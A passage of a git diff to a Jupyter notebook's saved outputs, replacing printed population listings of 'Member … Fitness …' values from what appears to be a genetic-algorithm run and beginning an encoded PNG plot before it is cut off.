12346628 Fitness 598.0\\n\",\n-      \"Member 12373352 Fitness 494.0\\n\",\n-      \"Member 12342748 Fitness 582.0\\n\",\n-      \"Member 12235684 Fitness 461.0\\n\",\n-      \"Member 12236688 Fitness 468.0\\n\",\n-      \"Member 12346764 Fitness 573.0\\n\",\n-      \"Member 12346868 Fitness 580.0\\n\",\n-      \"Member 12826633 Fitness 458.0\\n\",\n-      \"Member 12826686 Fitness 457.0\\n\",\n-      \"Member 12346564 Fitness 564.0\\n\",\n-      \"Member 11376861 Fitness 409.0\\n\",\n-      \"Member 12377154 Fitness 500.0\\n\",\n-      \"Member 12476652 Fitness 460.0\\n\",\n-      \"Member 15344688 Fitness 408.0\\n\",\n-      \"Member 15348688 Fitness 412.0\\n\",\n-      \"Member 12342758 Fitness 568.0\\n\",\n-      \"Member 15366752 Fitness 405.0\\n\",\n-      \"Member 12416657 Fitness 460.0\\n\",\n-      \"Member 12816652 Fitness 454.0\\n\",\n-      \"Member 12276684 Fitness 458.0\\n\",\n-      \"Member 82342784 Fitness 350.0\\n\",\n-      \"Member 82321688 Fitness 362.0\\n\",\n-      \"Member 15321688 Fitness 405.0\\n\",\n-      \"Member 12261688 Fitness 455.0\\n\",\n-      \"Member 12261683 Fitness 445.0\\n\",\n-      \"Member 12372686 Fitness 499.0\\n\",\n-      \"Member 72826655 Fitness 340.0\\n\",\n-      \"Member 12341672 Fitness 568.0\\n\",\n-      \"Member 12345678 Fitness 806.0\\n\",\n-      \"Member 12321683 Fitness 516.0\\n\",\n-      \"Member 52336688 Fitness 354.0\\n\",\n-      \"Member 12376678 Fitness 520.0\\n\",\n-      \"Member 12324164 Fitness 507.0\\n\",\n-      \"Member 16376752 Fitness 401.0\\n\",\n-      \"Member 12376688 Fitness 498.0\\n\",\n-      \"Member 12337188 Fitness 495.0\\n\",\n-      \"Member 32342787 Fitness 344.0\\n\",\n-      \"Member 22378214 Fitness 345.0\\n\",\n-      \"Member 12378218 Fitness 498.0\\n\",\n-      \"Member 12374164 Fitness 492.0\\n\",\n-      \"Member 14324148 Fitness 404.0\\n\",\n-      \"Member 12374688 Fitness 498.0\\n\",\n-      \"Member 18553686 Fitness 404.0\\n\",\n-      \"Member 12346588 Fitness 576.0\\n\",\n-      \"Member 12347788 Fitness 563.0\\n\",\n-      \"Member 12377688 Fitness 510.0\\n\",\n-      \"Member 82377688 Fitness 347.0\\n\",\n-      \"Member 12836278 Fitness 12200.0\\n\",\n-      \"Member 12376764 Fitness 1407.0\\n\",\n-      \"Member 68331288 Fitness 743.0\\n\",\n-      \"Member 12321665 Fitness 927.0\\n\",\n-      \"Member 12375688 Fitness 756.0\\n\",\n-      \"Member 17375688 Fitness 420.0\\n\",\n-      \"Member 12372787 Fitness 497.0\\n\",\n-      \"Member 42342755 Fitness 374.0\\n\",\n-      \"Member 12826676 Fitness 476.0\\n\",\n-      \"Member 18376655 Fitness 421.0\\n\",\n-      \"Member 42354188 Fitness 388.0\\n\",\n-      \"Member 12374188 Fitness 498.0\\n\",\n-      \"Member 12324284 Fitness 497.0\\n\",\n-      \"Member 12321238 Fitness 505.0\\n\",\n-      \"Member 12346687 Fitness 586.0\\n\",\n-      \"Member 17376618 Fitness 402.0\\n\",\n-      \"Member 42333288 Fitness 366.0\\n\",\n-      \"Member 11133288 Fitness 404.0\\n\",\n-      \"Member 12372676 Fitness 501.0\\n\",\n-      \"Member 12526688 Fitness 459.0\\n\",\n-      \"Member 12374864 Fitness 496.0\\n\",\n-      \"Member 12846584 Fitness 460.0\\n\",\n-      \"Member 14342788 Fitness 405.0\\n\",\n-      \"Member 12356722 Fitness 496.0\\n\",\n-      \"Member 72353243 Fitness 364.0\\n\",\n-      \"Member 14351478 Fitness 414.0\\n\",\n-      \"Member 12834154 Fitness 465.0\\n\",\n-      \"Member 12134588 Fitness 464.0\\n\",\n-      \"Member 52376154 Fitness 363.0\\n\",\n-      \"Member 12364684 Fitness 503.0\\n\",\n-      \"Member 12361684 Fitness 497.0\\n\",\n-      \"Member 12324164 Fitness 1724.0\\n\",\n-      \"Member 75353284 Fitness 871.0\\n\",\n-      \"Member 12353288 Fitness 721.0\\n\",\n-      \"Member 12374188 Fitness 504.0\\n\",\n-      \"Member 12374188 Fitness 502.0\\n\",\n-      \"Member 12133288 Fitness 480.0\\n\",\n-      \"Member 11153288 Fitness 410.0\\n\"\n+      \"Member 0183455645 Fitness 640.5\\n\",\n+      \"Member 0123456682 Fitness 1063.5\\n\",\n+      \"Member 0223053309 Fitness 563.0\\n\",\n+      \"Member 0123056094 Fitness 822.0\\n\",\n+      \"Member 0125456707 Fitness 725.0\\n\",\n+      \"Member 0125456707 Fitness 724.0\\n\",\n+      \"Member 0123456407 Fitness 1066.5\\n\",\n+      \"Member 0123742689 Fitness 821.0\\n\",\n+      \"Member 0183439474 Fitness 644.5\\n\",\n+      \"Member 0523456782 Fitness 567.5\\n\",\n+      \"Member 0123451745 Fitness 983.0\\n\",\n+      \"Member 0913476796 Fitness 562.0\\n\",\n+      \"Member 0123448891 Fitness 903.5\\n\",\n+      \"Member 0123449795 Fitness 907.0\\n\",\n+      \"Member 0123693482 Fitness 819.5\\n\",\n+      \"Member 0113462082 Fitness 650.0\\n\",\n+      \"Member 0823496682 Fitness 565.5\\n\",\n+      \"Member 0123446605 Fitness 904.5\\n\",\n+      \"Member 0183456694 Fitness 648.0\\n\",\n+      \"Member 0183456694 Fitness 640.0\\n\",\n+      \"Member 0823486095 Fitness 564.5\\n\",\n+      \"Member 0913446091 Fitness 560.5\\n\",\n+      \"Member 0123676045 Fitness 823.5\\n\",\n+      \"Member 7123456647 Fitness 489.5\\n\",\n+      \"Member 0123466705 Fitness 900.0\\n\",\n+      \"Member 5123452707 Fitness 482.5\\n\",\n+      \"Member 0123456798 Fitness 1153.0\\n\",\n+      \"Member 0123451796 Fitness 985.5\\n\",\n+      \"Member 4123456407 Fitness 476.0\\n\",\n+      \"Member 0193456774 Fitness 647.0\\n\",\n+      \"Member 0123488600 Fitness 903.5\\n\",\n+      \"Member 0023453199 Fitness 565.5\\n\",\n+      \"Member 0473456705 Fitness 560.5\\n\",\n+      \"Member 0143466709 Fitness 646.5\\n\",\n+      \"Member 0897413892 Fitness 562.0\\n\",\n+      \"Member 2127416896 Fitness 483.0\\n\",\n+      \"Member 1123447499 Fitness 484.5\\n\",\n+      \"Member 0123410392 Fitness 912.0\\n\",\n+      \"Member 0123442774 Fitness 901.5\\n\",\n+      \"Member 0123442042 Fitness 905.0\\n\",\n+      \"Member 0123442701 Fitness 901.5\\n\",\n+      \"Member 0623442042 Fitness 561.0\\n\",\n+      \"Member 0123466707 Fitness 905.0\\n\",\n+      \"Member 7123481082 Fitness 480.5\\n\",\n+      \"Member 0123467799 Fitness 910.0\\n\",\n+      \"Member 0123436729 Fitness 905.0\\n\",\n+      \"Member 0123456694 Fitness 1082.0\\n\",\n+      \"Member 0153356482 Fitness 648.0\\n\",\n+      \"Member 0323673457 Fitness 605.5\\n\",\n+      \"Member 0123673446 Fitness 861.0\\n\",\n+      \"Member 0123496640 Fitness 954.0\\n\",\n+      \"Member 0423496645 Fitness 603.0\\n\",\n+      \"Member 0123456784 Fitness 1270.0\\n\",\n+      \"Member 0123456789 Fitness 1261.5\\n\",\n+      \"Member 0129453199 Fitness 769.0\\n\",\n+      \"Member 0123453199 Fitness 1025.5\\n\",\n+      \"Member 0123252782 Fitness 866.5\\n\",\n+      \"Member 0623453487 Fitness 601.0\\n\",\n+      \"Member 0523457799 Fitness 605.0\\n\",\n+      \"Member 0123457799 Fitness 1027.0\\n\",\n+      \"Member 0123481082 Fitness 946.5\\n\",\n+      \"Member 0123487499 Fitness 947.0\\n\",\n+      \"Member 3123456775 Fitness 518.0\\n\",\n+      \"Member 0123406774 Fitness 944.5\\n\",\n+      \"Member 0123096776 Fitness 855.0\\n\",\n+      \"Member 0123097772 Fitness 860.0\\n\",\n+      \"Member 0133456455 Fitness 675.0\\n\",\n+      \"Member 0123443754 Fitness 933.0\\n\",\n+      \"Member 9153446757 Fitness 521.5\\n\",\n+      \"Member 0126446705 Fitness 780.5\\n\",\n+      \"Member 0123446643 Fitness 948.0\\n\",\n+      \"Member 0123449795 Fitness 928.0\\n\",\n+      \"Member 0123456757 Fitness 1195.0\\n\",\n+      \"Member 8123456729 Fitness 525.0\\n\",\n+      \"Member 0123786891 Fitness 858.0\\n\",\n+      \"Member 0123447499 Fitness 949.5\\n\",\n+      \"Member 0123448795 Fitness 941.0\\n\",\n+      \"Member 0103449799 Fitness 685.5\\n\",\n+      \"Member 0103293792 Fitness 665.5\\n\",\n+      \"Member 0323693499 Fitness 594.0\\n\",\n+      \"Member 0123456796 Fitness 1191.0\\n\",\n+      \"Member 0123456991 Fitness 1098.0\\n\",\n+      \"Member 0373416656 Fitness 593.0\\n\",\n+      \"Member 0473456440 Fitness 591.5\\n\",\n+      \"Member 0123293774 Fitness 872.0\\n\",\n+      \"Member 0123456407 Fitness 1112.5\\n\",\n+      \"Member 0123847496 Fitness 855.5\\n\",\n+      \"Member 0123446091 Fitness 930.0\\n\",\n+      \"Member 0183462082 Fitness 687.5\\n\",\n+      \"Member 0183456682 Fitness 669.5\\n\",\n+      \"Member 0143456192 Fitness 670.5\\n\",\n+      \"Member 0123456194 Fitness 1119.5\\n\",\n+      \"Member 0123403492 Fitness 944.5\\n\",\n+      \"Member 8123416685 Fitness 524.5\\n\",\n+      \"Member 0123453157 Fitness 1017.0\\n\",\n+      \"Member 0183453199 Fitness 686.0\\n\",\n+      \"Member 0153446701 Fitness 677.0\\n\",\n+      \"Member 0153246745 Fitness 671.5\\n\",\n+      \"Member 0183456645 Fitness 661.5\\n\",\n+      \"Member 0123456647 Fitness 1109.5\\n\"\n      ]\n     },\n     {\n      \"data\": {\n-      \"image\/png\": \"iVBORw0KGgoAAAANSUhEUgAAAlUAAAHHCAYAAACWQK1nAAAAOXRFWHRTb2Z0d2FyZQBNYXRwbG90bGliIHZlcnNpb24zLjcuMSwgaHR0cHM6Ly9tYXRwbG90bGliLm9yZy\/bCgiHAAAACXBIWXMAAA9hAAAPYQGoP6dpAABwTUlEQVR4nO3deVwU9f8H8NdyLTd4cIiCYKh4H5CIt4muhqZpamYKmmdoKqVJpaBWmEceeadfsfKutLzDO408UMwTzVAsObwAEeXaz++P\/TGyArrgwHK8no\/HPtidec9n3jPs8d7PfGZWIYQQICIiIqKXYqDvBIiIiIgqAhZVRERERDJgUUVEREQkAxZVRERERDJgUUVEREQkAxZVRERERDJgUUVEREQkAxZVRERERDJgUUVEREQkAxZVRDq4ceMGFAoFwsPD9Z0KlRMBAQFwdXWVtc3w8HAoFArcuHFD1napaEJDQ6FQKPSdBpVBLKqI8PTDqqDb1KlTC1xm9+7dCA0NLd1ES9Dx48fx5ptvwsHBAUqlEq6urhg9ejTi4uL0nVo+hw8f1vofGRsbo06dOhg6dCj++ecffaf30r788kts375d32nko1ar8d1336Fr166oXr06jI2NYW9vj27dumHVqlXIyMjQd4qySU9PR2hoKA4fPqzvVKgcUfC3\/4g0RdWwYcMwc+ZMuLm5ac1r3LgxmjVrhoyMDBgbG8PQ0BAAMG7cOCxduhQV4SX0zTffYMKECahTpw4CAgJQo0YNXL58GatXrwagKSDbtGmj5yyfOnz4MDp37owPPvgAr776KrKysnDmzBmsWrUKlpaWOH\/+PJycnPSaY0BAAA4fPlysXiVLS0u89dZb+XpGc3JykJWVBaVSWeo9JY8fP8abb76Jffv2oU2bNujVqxccHBxw\/\/59HDlyBLt374a\/vz\/WrFlTqnmVlLt378LOzg4hISH5vjxlZ2cjOzsbpqam+kmOyiwjfSdAVJb06NEDXl5eBc6rqG+gx48fx8SJE9GuXTvs3bsX5ubm0ryxY8eibdu2eOutt3Dx4kVUqVKl1PJ69OgRLCwsnhvTvn17vPXWWwCAYcOGoV69evjggw+wbt06BAcHl0aapcrQ0FAq6kvbpEmTsG\/fPixcuBATJkzQmvfhhx\/i2rVriIiI0EtuusjOzoZarYaJiclLt2VkZAQjI358Un48\/Eekg2fHVAUEBGDp0qUAoHUYKm\/svHnzsGrVKrzyyitQKpV49dVXcerUqXxtX7lyBW+99RaqVq0KU1NTeHl54ddff9WKycrKwowZM1C3bl2YmpqiWrVqaNeundaHWEJCAoYNG4ZatWpBqVSiRo0a6N279wt7SmbNmgWFQoF169ZpFVQA8Morr2DOnDmIj4\/HypUrAQDz5s2DQqHAzZs387UVHBwMExMTPHjwQJp24sQJdO\/eHTY2NjA3N0fHjh1x\/PhxreVyx6hcunQJ77zzDqpUqYJ27do9N++CvPbaawCA2NhYadqyZcvQqFEjKJVKODk5ITAwEMnJyVrLderUCY0bN0ZUVBTatGkDMzMzuLm5YcWKFVpxhY1pyj0c+aJDRfPmzUObNm1QrVo1mJmZwdPTEz\/++KNWjEKhwKNHj7Bu3TrpeRUQEPDc9RdlGy9duoTOnTvD3NwcNWvWxJw5c56bMwDcunULq1evRvfu3fMVVLnq1q2L999\/X2uaWq3GwoUL0ahRI5iamsLBwQGjR4\/Wen4AgKurK3r27Iljx46hVatWMDU1RZ06dfDdd9\/lW09ycjImTpwIZ2dnKJVKuLu746uvvoJarZZi8r4GFy5cKL0GL126hMzMTEyfPh2enp6wsbGBhYUF2rdvj0OHDmktb2dnBwCYMWOG9H\/I7bEqaExVdnY2Zs2aJa3L1dUVn3zySb5DokXZVip\/WFQR5ZGSkoK7d+9q3QoyevRodO3aFQDw\/fffS7e8NmzYgLlz52L06NH4\/PPPcePGDfTt2xdZWVlSzMWLF9G6dWtcvnwZU6dOxfz582FhYYE+ffpg27ZtUlxoaChmzJiBzp07Y8mSJfj000\/h4uKCM2fOSDH9+vXDtm3bMGzYMCxbtgwffPABHj58+NwxUenp6Thw4ADat2+f77BnroEDB0KpVGLnzp0AgAEDBkChUGDLli35Yrds2YJu3bpJPVoHDx5Ehw4dkJqaipCQEHz55ZdITk7Ga6+9hpMnT+Zbvn\/\/\/khPT8eXX36JkSNHFpp3Ya5fvw4AqFatGgDNfgsMDISTkxPmz5+Pfv36YeXKlejWrZvW\/wEAHjx4gNdffx2enp6YM2cOatWqhbFjx+J\/\/\/tfkfMozKJFi9CiRQvMnDkTX375JYyMjNC\/f3\/s2rVLivn++++hVCrRvn176Xk1evToQtss6jZ2794dzZo1w\/z58+Hh4YGPP\/4Ye\/bseW7ee\/bsQU5ODt59990ibe\/o0aMxefJktG3bFosWLcKwYcOwfv16qFSqfLn9\/fffeOutt9C1a1fMnz8fVapUQUBAAC5evCjFpKeno2PHjvjhhx8wdOhQLF68GG3btkVwcDCCgoLyrX\/t2rX45ptvMGrUKMyfPx9Vq1ZFamoqVq9ejU6dOuGrr75CaGgo7ty5A5VKhejoaACAnZ0dli9fDgB48803pf9D3759C93WESNGYPr06WjZsiUWLFiAjh07IiwsDG+\/\/Xa+WF22lcopQURi7dq1AkCBNyGEiI2NFQDE2rVrpWUCAwNFQS+h3Nhq1aqJ+\/fvS9N\/+eUXAUDs2LFDmtalSxfRpEkT8eTJE2maWq0Wbdq0EXXr1pWmNWvWTPj5+RWa\/4MHDwQAMXfu3CJtd3R0tAAgJkyY8Ny4pk2biqpVq0qPfXx8hKenp1bMyZMnBQDx3XffSdtRt25doVKphFqtluLS09OFm5ub6Nq1qzQtJCREABCDBg3SKe9Dhw4JAOJ\/\/\/ufuHPnjrh9+7bYtWuXcHV1FQqFQpw6dUokJSUJExMT0a1bN5GTkyMtu2TJEmnZXB07dhQAxPz586VpGRkZonnz5sLe3l5kZmYKIZ4+T2JjYwvM59ChQ9I0f39\/Ubt2ba249PR0rceZmZmicePG4rXXXtOabmFhIfz9\/fNt97PrL8425v5\/crfR0dFR9OvXL9+68po0aZIAIKKjo7WmZ2RkiDt37ki3u3fvSvN+\/\/13AUCsX79ea5m9e\/fmm167dm0BQBw9elSalpSUJJRKpfjwww+labNmzRIWFhbi6tWrWm1OnTpVGBoairi4OCHE09egtbW1SEpK0orNzs4WGRkZWtMePHggHBwcxPDhw6Vpd+7cEQBESEhIvv2R+3zNlfs6GjFihFbcRx99JACIgwcPFnlbqXxiTxVRHkuXLkVERITWrbgGDhyoNQapffv2ACCdnXb\/\/n0cPHgQAwYMwMOHD6WesXv37kGlUuHatWv477\/\/AAC2tra4ePEirl27VuC6zMzMYGJigsOHD+c7tPI8Dx8+BABYWVk9N87Kygqpqala2xYVFSX1DAHA5s2boVQq0bt3bwBAdHQ0rl27hnfeeQf37t2Ttu\/Ro0fo0qULjh49qnXIBgDGjBmjc+4AMHz4cNjZ2cHJyQl+fn7SYTMvLy\/s378fmZmZmDhxIgwMnr7VjRw5EtbW1lq9Q4BmnEzeHiETExOMHj0aSUlJiIqKKlJehTEzM5PuP3jwACkpKWjfvr1Wj2NRFHUbLS0ttXqbTExM0KpVqxeeMZn7v7e0tNSavnv3btjZ2Um32rVrS\/O2bt0KGxsbdO3aVavn19PTE5aWllqH2wCgYcOG0msE0PQW1a9fXyu3rVu3on379qhSpYpWm76+vsjJycHRo0e12uzXr590GC+XoaGhNK5KrVbj\/v37yM7OhpeXV7H\/D7t37waAfL1lH374IQDk+z\/osq1UPnGkHVEerVq1KnSgelG5uLhoPc4tsHKLnr\/\/\/htCCEybNg3Tpk0rsI2kpCTUrFkTM2fORO\/evVGvXj00btwY3bt3x5AhQ9C0aVMAgFKpxFdffYUPP\/wQDg4OaN26NXr27ImhQ4fC0dGx0Bxzi6nc4qowDx8+1Cq8+vfvj6CgIGzevBmffPIJhBDYunUrevToAWtrawCQCkB\/f\/9C201JSdEqPAs7BFmY6dOno3379jA0NET16tXRoEEDaQBx7piv+vXray1jYmKCOnXq5BsT5uTklG9gfL169QBoxti0bt26SLkVZOfOnfj8888RHR2tNdamuGfyFXUba9WqlW9dVapUwV9\/\/fXc9eT+79PS0rSmt23bVvriMXfuXK2xcteuXUNKSgrs7e0LbDMpKUnr8bOvl9zc8n5JuHbtGv766698hVJhbRb2fFq3bh3mz5+PK1euaB2GLOrzL9fNmzdhYGAAd3d3remOjo6wtbXN93\/QZVupfGJRRVRCCjtLS\/z\/JRhye2k++ugjqFSqAmNz36Q7dOiA69ev45dffsFvv\/2G1atXY8GCBVixYgVGjBgBAJg4cSJ69eqF7du3Y9++fZg2bRrCwsJw8OBBtGjRotD2jYyMnvuhmpGRgZiYGK1i08nJCe3bt8eWLVvwySef4M8\/\/0RcXBy++uorKSZ3++bOnYvmzZsX2PazPR95e3J00aRJE\/j6+hZpmZdRWPGTk5PzwmV\/\/\/13vPHGG+jQoQOWLVuGGjVqwNjYGGvXrsWGDRvkTrVAL3pOFsbDwwMAcOHCBTRr1kyabmdnJ+3\/H374QWsZtVoNe3t7rF+\/vsA2C+pBelFuarUaXbt2xZQpUwqMzS2CcxX0fPrhhx8QEBCAPn36YPLkybC3t4ehoSHCwsK0el6LQ9fiuLj\/Byr7WFQRFdPLXieoTp06AABjY2OdCoOqVati2LBhGDZsGNLS0tChQweEhoZKRRWgOVvvww8\/lE5xb968OebPn5\/vAy+XhYUFOnfujIMHD+LmzZtah29ybdmyBRkZGejZs6fW9IEDB+L9999HTEwMNm\/eDHNzc\/Tq1UsrFwCwtrYu1cInV+62xMTESPsaADIzMxEbG5svp9u3b+e7jMPVq1cBQLoyem6v2rNn1hV0JuSzfvrpJ5iammLfvn1QKpXS9LVr1+aL1fW5VdRtLK4ePXrA0NAQ69evx+DBg3Va5pVXXsH+\/fvRtm3bIhfLz2szLS3tpbbrxx9\/RJ06dfDzzz9r7eeQkBCtuKK8vmvXrg21Wo1r166hQYMG0vTExEQkJycX+LqiioljqoiKKffD99kPWF3Z29ujU6dOWLlyJeLj4\/PNv3PnjnT\/3r17WvMsLS3h7u4uHUJKT0\/HkydPtGJeeeUVWFlZvfAq15999hmEEAgICMDjx4+15sXGxmLKlCmoUaNGvjPQ+vXrB0NDQ2zcuBFbt25Fz549tQoST09PvPLKK5g3b16+w0bPbl9J8PX1hYmJCRYvXqzVA7BmzRqkpKTAz89PKz47O1u6bASgKUxWrlwJOzs7eHp6AnhaKOYdu5OTk4NVq1a9MB9DQ0MoFAqtXq0bN24UeOV0CwsLnZ5XRd3G4nJxccHw4cOxZ88eLFmypMCYZ3tZBgwYgJycHMyaNStfbHZ2drFeNwMGDEBkZCT27duXb15ycjKys7Nf2EZuL1HefE+cOIHIyEituNzLi+iS5+uvvw4AWLhwodb0r7\/+GgBk+z9Q2ceeKqJiyv2g\/eCDD6BSqWBoaFjg6dPPs3TpUrRr1w5NmjTByJEjUadOHSQmJiIyMhL\/\/vsvzp07B0AzsLVTp07w9PRE1apVcfr0afz4448YN24cAE2PSpcuXTBgwAA0bNgQRkZG2LZtGxITE1+YU4cOHTBv3jwEBQWhadOm0hXVr1y5gm+\/\/RZqtRq7d+\/Od+FPe3t7dO7cGV9\/\/TUePnyIgQMHas03MDDA6tWr0aNHDzRq1AjDhg1DzZo18d9\/\/+HQoUOwtrbGjh07irS\/isLOzg7BwcGYMWMGunfvjjfeeAMxMTFYtmwZXn311XyXB3BycsJXX32FGzduoF69eti8eTOio6OxatUqGBsbAwAaNWqE1q1bIzg4GPfv30fVqlWxadMmnT7M\/fz88PXXX6N79+545513kJSUhKVLl8Ld3T3f4VdPT0\/s378fX3\/9NZycnODm5gZvb++X3saXsXDhQsTGxmL8+PHYtGkTevXqBXt7e9y9exfHjx\/Hjh07tMZ2dezYEaNHj0ZYWBiio6PRrVs3GBsb49q1a9i6dSsWLVokXbhVV5MnT8avv\/6Knj17IiAgAJ6ennj06BHOnz+PH3\/8ETdu3ED16tWf20bPnj3x888\/480334Sfnx9iY2OxYsUKNGzYUKv4NzMzQ8OGDbF582bUq1cPVatWRePGjdG4ceN8bTZr1gz+\/v5YtWoVkpOT0bFjR5w8eRLr1q1Dnz590Llz5yJtJ5VjejrrkKhMyT1V\/dSpUwXOL+iSCtnZ2WL8+PHCzs5OKBSKfJdfKOjyBijgFO3r16+LoUOHCkdHR2FsbCxq1qwpevbsKX788Ucp5vPPPxetWrUStra2wszMTHh4eIgvvvhCOtX\/7t27IjAwUHh4eAgLCwthY2MjvL29xZYtW3TeB0ePHhW9e\/cW1atXF8bGxsLFxUWMHDlS3Lhxo9Blvv32WwFAWFlZicePHxcYc\/bsWdG3b19RrVo1oVQqRe3atcWAAQPEgQMHpJjcU9Tv3LmjU665lzDYunXrC2OXLFkiPDw8hLGxsXBwcBBjx44VDx480Irp2LGjaNSokTh9+rTw8fERpqamonbt2mLJkiX52rt+\/brw9fUVSqVSODg4iE8++URERETodEmFNWvWiLp16wqlUik8PDzE2rVr852eL4QQV65cER06dBBmZmYCgHR5hcIu6VCUbXxWQXkWJjs7W6xdu1a89tpromrVqsLIyEhUr15ddOnSRaxYsaLA58CqVauEp6enMDMzE1ZWVqJJkyZiypQp4vbt21JM7dq1C7xkSMeOHUXHjh21pj18+FAEBwcLd3d3YWJiIqpXry7atGkj5s2bJ70envcaVKvV4ssvvxS1a9cWSqVStGjRQuzcubPA\/fDHH38IT09PYWJiovXaLeh\/lpWVJWbMmCHc3NyEsbGxcHZ2FsHBwVqXSynqtlL5w9\/+I6JKr1OnTrh79y4uXLig71SIqBzjmCoiIiIiGbCoIiIiIpIBiyoiIiIiGXBMFREREZEM2FNFREREJAMWVUREREQy4MU\/S5Farcbt27dhZWX10j9xQkRERKVDCIGHDx\/CyckJBgaF90exqCpFt2\/fhrOzs77TICIiomK4desWatWqVeh8FlWlyMrKCoDmn2Jtba3nbIiIiEgXqampcHZ2lj7HC8OiqhTlHvKztrZmUUVERFTOvGjoDgeqExEREcmARRURERGRDFhUEREREcmAY6qIiKjMycnJQVZWlr7ToErC2NgYhoaGL90OiyoiIiozhBBISEhAcnKyvlOhSsbW1haOjo4vdR1JFlVERFRm5BZU9vb2MDc354WSqcQJIZCeno6kpCQAQI0aNYrdFosqIiIqE3JycqSCqlq1avpOhyoRMzMzAEBSUhLs7e2LfSiQA9WJiKhMyB1DZW5urudMqDLKfd69zFg+FlVERFSm8JAf6YMczzsWVUREREQyYFFFREREsrpx4wYUCgWio6P1nUqpYlFFREQkk8jISBgaGsLPz0\/fqZQKhUKR79auXTs4OzsjPj4ejRs3BgAcPnwYCoWiwl8qg2f\/VRRZTwBDE8CAdTIRkb6sWbMG48ePx5o1a3D79m04OTmV2LqEEMjJyYGRkX4\/yteuXYvu3btLj01MTGBoaAhHR0c9ZqUf\/ASuCDLSgLBawKqO+s6EiKjSSktLw+bNmzF27Fj4+fkhPDxcmvfOO+9g4MCBWvFZWVmoXr06vvvuOwCAWq1GWFgY3NzcYGZmhmbNmuHHH3+U4nN7e\/bs2QNPT08olUocO3YM169fR+\/eveHg4ABLS0u8+uqr2L9\/v9a64uPj4efnBzMzM7i5uWHDhg1wdXXFwoULpZjk5GSMGDECdnZ2sLa2xmuvvYZz5869cLtzL5qZe6tatarW4b8bN26gc+fOAIAqVapAoVAgICAAANCpUyd88MEHmDJlCqpWrQpHR0eEhoZqtf+ivM6dO4fOnTvDysoK1tbW8PT0xOnTpwEAN2\/eRK9evVClShVYWFigUaNG2L179wu3qbjYU1URxEUC6iwg4S99Z0JEJCshBB5n5ehl3WbGhkU6I2zLli3w8PBA\/fr18e6772LixIkIDg6GQqHA4MGD0b9\/f6SlpcHS0hIAsG\/fPqSnp+PNN98EAISFheGHH37AihUrULduXRw9ehTvvvsu7Ozs0LHj0y\/NU6dOxbx581CnTh1UqVIFt27dwuuvv44vvvgCSqUS3333HXr16oWYmBi4uLgAAIYOHYq7d+\/i8OHDMDY2RlBQkHSxy1z9+\/eHmZkZ9uzZAxsbG6xcuRJdunTB1atXUbVq1WLvR2dnZ\/z000\/o168fYmJiYG1tLV0XCgDWrVuHoKAgnDhxApGRkQgICEDbtm3RtWtXnfIaPHgwWrRogeXLl8PQ0BDR0dEwNjYGAAQGBiIzMxNHjx6FhYUFLl26JO3\/ksCiioiIyqzHWTloOH2fXtZ9aaYK5ia6f0yuWbMG7777LgCge\/fuSElJwZEjR9CpUyeoVCpYWFhg27ZtGDJkCABgw4YNeOONN2BlZYWMjAx8+eWX2L9\/P3x8fAAAderUwbFjx7By5UqtomrmzJlSwQEAVatWRbNmzaTHs2bNwrZt2\/Drr79i3LhxuHLlCvbv349Tp07By8sLALB69WrUrVtXWubYsWM4efIkkpKSoFQqAQDz5s3D9u3b8eOPP2LUqFGFbvegQYO0Lpb5ww8\/oHnz5tJjQ0NDqSizt7eHra2t1vJNmzZFSEgIAKBu3bpYsmQJDhw4gK5du+qUV1xcHCZPngwPDw+pjVxxcXHo168fmjRpIu3TksSiioiI6CXFxMTg5MmT2LZtGwDAyMgIAwcOxJo1a9CpUycYGRlhwIABWL9+PYYMGYJHjx7hl19+waZNmwAAf\/\/9N9LT07WKJQDIzMxEixYttKblFka50tLSEBoail27diE+Ph7Z2dl4\/Pgx4uLipNyMjIzQsmVLaRl3d3dUqVJFenzu3DmkpaXlu5L948ePcf369edu+4IFC+Dr6ys9rlGjBu7cufPcZfJq2rSp1uMaNWpIvWi65BUUFIQRI0bg+++\/h6+vL\/r3749XXnkFAPDBBx9g7Nix+O233+Dr64t+\/frlW5+c9F5U\/ffff\/j444+xZ88epKenw93dHWvXrpWeNEIIhISE4Ntvv0VycjLatm2L5cuXa1Wi9+\/fx\/jx47Fjxw4YGBigX79+WLRokVYX319\/\/YXAwECcOnUKdnZ2GD9+PKZMmaKVy9atWzFt2jTcuHEDdevWxVdffYXXX39dmq9LLkREJB8zY0NcmqnS27p1tWbNGmRnZ2sNTBdCQKlUYsmSJbCxscHgwYPRsWNHJCUlISIiAmZmZtIA77S0NADArl27ULNmTa22c3tocllYWGg9\/uijjxAREYF58+bB3d0dZmZmeOutt5CZmalz\/mlpaahRowYOHz6cb96zPUvPcnR0hLu7u9a0ohRVuYfqcikUCqjVap3zCg0NxTvvvINdu3Zhz549CAkJwaZNm\/Dmm29ixIgRUKlU2LVrF3777TeEhYVh\/vz5GD9+vM75FYVei6oHDx6gbdu26Ny5M\/bs2QM7Oztcu3ZNq3qeM2cOFi9ejHXr1sHNzQ3Tpk2DSqXCpUuXYGpqCgAYPHgw4uPjERERgaysLAwbNgyjRo3Chg0bAACpqano1q0bfH19sWLFCpw\/fx7Dhw+Hra2t1KX5xx9\/YNCgQQgLC0PPnj2xYcMG9OnTB2fOnJFOCdUlFyIiko9CoSjSITh9yM7OxnfffYf58+ejW7duWvP69OmDjRs3YsyYMWjTpg2cnZ2xefNm7NmzB\/3795cKioYNG0KpVCIuLk7rUJ8ujh8\/joCAAGlsVlpaGm7cuCHNr1+\/PrKzs3H27Fl4enoC0PSMPXjwQIpp2bIlEhISYGRkBFdX12LsheczMTEBoPl9x6LQNa969eqhXr16mDRpEgYNGoS1a9dK+8PZ2RljxozBmDFjEBwcjG+\/\/bbEiioIPfr4449Fu3btCp2vVquFo6OjmDt3rjQtOTlZKJVKsXHjRiGEEJcuXRIAxKlTp6SYPXv2CIVCIf777z8hhBDLli0TVapUERkZGVrrrl+\/vvR4wIABws\/PT2v93t7eYvTo0Trn8iIpKSkCgEhJSdEpXmdXfxMixFpzIyIqpx4\/fiwuXbokHj9+rO9UimTbtm3CxMREJCcn55s3ZcoU4eXlJT3+9NNPRcOGDYWRkZH4\/ffftWI\/\/fRTUa1aNREeHi7+\/vtvERUVJRYvXizCw8OFEEIcOnRIABAPHjzQWu7NN98UzZs3F2fPnhXR0dGiV69ewsrKSkyYMEGK8fX1FS1bthQnTpwQZ86cEZ07dxZmZmZi4cKFQgjNZ1y7du1Es2bNxL59+0RsbKw4fvy4+OSTT7Q+X58FQGzbti3f9NjYWAFAnD17VgghxL\/\/\/isUCoUIDw8XSUlJ4uHDh0IIITp27KiVpxBC9O7dW\/j7++uUV3p6uggMDBSHDh0